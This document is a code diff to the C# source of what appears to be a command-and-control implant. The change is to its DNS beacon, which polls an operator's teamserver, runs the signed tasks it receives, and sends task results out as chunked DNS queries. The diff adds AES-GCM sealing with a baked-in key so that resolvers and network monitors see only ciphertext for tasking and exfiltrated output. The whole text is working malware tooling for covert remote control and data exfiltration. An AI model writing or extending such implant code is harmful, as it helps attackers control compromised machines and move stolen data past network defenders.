@@ -22,6 +22,13 @@ namespace Rod.Implant.Internal;
 // concatenate to the base32 of a marshaled, signed TaskRequest; a result
 // is reported as chunked queries (label-budget chunks, 0-origin, a
 // terminal flag closing the reassembly server-side).
+//
+// Sealing (a build that baked an envelope key, the web posture's own rule):
+// the poll names the key id (k. instead of p.), so the answer arrives as a
+// raw R1 AES-GCM body under a DNS-purpose tag -- the resolver chain reads
+// no tasking or input bytes in the clear; results and channel outputs seal
+// whole before chunking, so their bytes cross as ciphertext too. A build
+// with no key keeps the plaintext grammar end to end.
 
 internal static class DnsCheckIn
 {
@@ -36,7 +43,8 @@ internal static class DnsCheckIn
         setup.Log,
         setup.Nonces,
         setup.Cadence,
-        setup.Held);
+        setup.Held,
+        setup.Config.Transport);
 }
 
 /// <summary>
@@ -53,6 +61,13 @@ internal sealed class DnsBeacon : ICheckInClient
     // characters, leaving room for the grammar's fixed labels.
     private const int ChunkBytes = 30;
 
+    // The DNS carriage's purpose tags, the teamserver's AesGcmEnvelope
+    // contract verbatim: one per direction and shape, so one purpose's
+    // ciphertext never validates as another's under the same key.
+    private const string PollAnswerAad = "rod-dns-poll-v1";
+    private const string ResultAad = "rod-dns-result-v1";
+    private const string ChannelAad = "rod-dns-channel-v1";
+
     private readonly EgressEndpoints _egress;    private readonly string _implantId;
     private readonly IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> _cas;
     private readonly TimeSpan _sleep;
@@ -62,6 +77,10 @@ internal sealed class DnsBeacon : ICheckInClient
     private readonly Cadence? _cadence;
     private readonly TaskNonceTracker _nonces;
     private readonly HeldTaskLedger _held;
+
+    // The baked envelope key's halves, when the build sealed check-ins: the
+    // k-poll names the id, the answers and reports seal under the key.
+    private readonly (byte[] KeyId, byte[] Key)? _seal;
 
     // The shared task-acceptance pipeline (fronting gate, verification,
     // dedup, staged/channel/inline shapes) over this client's per-run
@@ -84,7 +103,8 @@ internal sealed class DnsBeacon : ICheckInClient
         TextWriter log,
         TaskNonceTracker? nonces = null,
         Cadence? cadence = null,
-        HeldTaskLedger? held = null)
+        HeldTaskLedger? held = null,
+        TransportProfile? transport = null)
     {
         _egress = egress;
         _implantId = implantId;
@@ -96,6 +116,9 @@ internal sealed class DnsBeacon : ICheckInClient
         _cadence = cadence;
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
+        _seal = transport is { SealsCheckIns: true }
+            ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
+            : null;
         _poll = new PollChannels(_held, log);
         _tasking = new BeaconTasking(
             _implantId, _cas, enroll?.Fronted, _nonces, _held,
@@ -182,12 +205,27 @@ internal sealed class DnsBeacon : ICheckInClient
     private async Task<bool> RunOnceAsync(CancellationToken cancellationToken)
     {
         var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
-        var answer = await DnsDial.QueryAsync(
-            _egress.CurrentBeaconUrl, DnsNames.PollName(_implantId, zone), _cas, cancellationToken);
+        // The sealed build polls k.-named (the key id in the name, so the
+        // answer seals under it); a keyless build keeps the p. grammar.
+        var pollName = _seal is { } seal
+            ? DnsNames.SealedPollName(_implantId, new Guid(seal.KeyId), zone)
+            : DnsNames.PollName(_implantId, zone);
+        var answer = await DnsDial.QueryAsync(_egress.CurrentBeaconUrl, pollName, _cas, cancellationToken);
         if (answer is null || answer.Length == 0)
         {
             await FlushPollBatchAsync(cancellationToken);
             return true; // a quiet poll: presence refreshed, no tasking
+        }
+
+        // A sealed answer opens before its kind byte is read (the R1 magic
+        // leads, which no kind byte collides with); a plaintext answer from
+        // a server that lost the key's payload record still carries its
+        // kind byte directly -- the signature, not the seal, gates
+        // execution, so the degraded answer runs the ordinary path.
+        if (_seal is { } open && answer.Length >= 2 && answer[0] == (byte)'R' && answer[1] == (byte)'1')
+        {
+            answer = EnvelopeWire.TryOpenBody(answer, open.KeyId, open.Key, PollAnswerAad)
+                ?? throw new FormatException("a sealed DNS poll answer did not verify under the baked key");
         }
 
         // The answer's kind byte names its frame: a task to run, or parked
@@ -274,6 +312,10 @@ internal sealed class DnsBeacon : ICheckInClient
         string taskId, byte[] data, CancellationToken cancellationToken)
     {
         var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
+        // The sealed build wraps the whole payload once (the overhead is
+        // per-blob, not per-chunk), then chunks the ciphertext.
+        if (_seal is { } seal)
+            data = EnvelopeWire.SealBody(data, seal.KeyId, seal.Key, ChannelAad);
         var chunks = (data.Length + ChunkBytes - 1) / ChunkBytes;
         for (var index = 0; index < Math.Max(chunks, 1); index++)
         {
@@ -334,6 +376,11 @@ internal sealed class DnsBeacon : ICheckInClient
     {
         var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
         var bytes = Encoding.UTF8.GetBytes(output);
+        // The sealed build wraps the whole output once, then chunks the
+        // ciphertext -- the outcome flag stays in the name, where it rides
+        // either way.
+        if (_seal is { } seal)
+            bytes = EnvelopeWire.SealBody(bytes, seal.KeyId, seal.Key, ResultAad);
         var succeeded = outcome == TaskOutcome.Succeeded;
         var chunks = (bytes.Length + ChunkBytes - 1) / ChunkBytes;
         for (var index = 0; index < Math.Max(chunks, 1); index++)
@@ -667,6 +714,13 @@ internal static class DnsNames
 {
     public static string PollName(string implantId, string zone)
         => $"p.{Encode(implantId)}.{zone}";
+
+    /// <summary>
+    /// Renders a key-named poll (the sealed carriage): the key id rides as
+    /// its raw 16 guid bytes, base32 like every label.
+    /// </summary>
+    public static string SealedPollName(string implantId, Guid keyId, string zone)
+        => $"k.{Encode(implantId)}.{Encode(keyId.ToByteArray())}.{zone}";
 
     /// <summary>
     /// Renders an enrollment-upload chunk name (the implant-side twin of
